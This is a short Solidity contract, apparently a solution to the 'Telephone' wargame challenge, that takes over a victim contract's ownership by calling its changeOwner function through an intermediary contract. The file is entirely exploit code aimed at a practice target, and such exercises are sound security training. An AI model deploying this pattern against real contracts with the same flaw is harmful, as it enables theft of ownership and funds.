//SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "./Telephone.sol";

import "hardhat/console.sol";

contract TelephoneAttack {

    Telephone public victimContract;

    constructor (address _victimContractAddr) {
        victimContract = Telephone(_victimContractAddr);
    }

    function attack () public {
        victimContract.changeOwner(msg.sender);
    }

}